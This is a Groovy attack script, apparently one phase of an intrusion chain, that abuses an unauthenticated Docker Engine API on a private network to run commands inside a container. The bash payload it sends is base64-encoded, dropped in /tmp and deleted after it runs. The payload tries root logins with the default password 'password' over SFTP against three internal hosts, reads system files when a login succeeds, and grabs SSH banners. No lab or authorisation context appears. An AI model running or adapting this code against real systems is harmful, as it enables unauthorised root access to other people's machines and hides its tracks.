// Phase 16: SFTP with --insecure (accept host key) for root:password
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(60000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def bash = '''#!/bin/bash
echo "===== SFTP root:password WITH --insecure ====="
# Add known_hosts or use -k for curl 7.29 (RHEL7)
# In curl 7.29, SFTP host key check uses ~/.ssh/known_hosts
# Solution: create fake known_hosts or use CURLOPT_SSH_KNOWNHOSTS

# Method 1: Accept all host keys by creating empty known_hosts
mkdir -p ~/.ssh 2>/dev/null
touch ~/.ssh/known_hosts

# Method 2: Use -k (may not work for SFTP in old curl)
# Method 3: Use --hostpubmd5 "" 

for host in 172.27.141.24 172.27.141.6 172.27.141.5; do
    echo "--- Testing root:password @ $host ---"
    # First, get the host key by connecting
    ssh-keyscan -H $host 2>/dev/null >> ~/.ssh/known_hosts
done

# Now retry with known hosts
for host in 172.27.141.24 172.27.141.6 172.27.141.5; do
    echo ""
    echo "=== SFTP $host ==="
    result=$(curl -sS --connect-timeout 5 -u "root:password" sftp://$host/ 2>&1)
    rc=$?
    echo "rc=$rc"
    echo "${result:0:500}"
    
    if [ $rc -eq 0 ]; then
        echo "*** SFTP_ROOT_ACCESS_CONFIRMED ***"
        # Read key files
        echo "--- /etc/hostname ---"
        curl -sS --connect-timeout 5 -u "root:password" sftp://$host/etc/hostname 2>&1
        echo ""
        echo "--- id via SCP ---"
        curl -sS --connect-timeout 5 -u "root:password" "sftp://$host/proc/self/status" 2>&1 | head -5
    fi
done

echo ""
echo "=== ALTERNATIVE: Python paramiko check ==="
python -c "
try:
    import paramiko
    print('PARAMIKO_AVAILABLE')
except:
    print('PARAMIKO_NOT_AVAILABLE')
try:
    import socket
    s = socket.socket()
    s.settimeout(3)
    s.connect(('172.27.141.24', 22))
    banner = s.recv(256)
    print('SSH_BANNER: ' + banner.decode().strip())
    s.close()
except Exception as e:
    print('ERR: ' + str(e))
" 2>&1
echo "DONE"
'''

def b64 = bash.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p16.sh && bash /tmp/_p16.sh 2>&1; rm -f /tmp/_p16.sh"
println execIn(cmd)
